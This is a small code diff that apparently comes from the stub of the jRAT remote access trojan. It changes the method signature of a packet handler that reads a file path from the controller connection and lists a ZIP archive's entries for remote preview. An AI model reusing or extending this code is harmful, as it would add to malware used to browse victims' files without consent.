@@ -13,7 +13,7 @@ import se.jrat.stub.packets.outgoing.Packet45ArchivePreview;
 public class Packet63PreviewArchive extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		String file = Connection.instance.readLine();
 		ZipFile zip = new ZipFile(file);
 		Enumeration<? extends ZipEntry> entries = zip.entries();
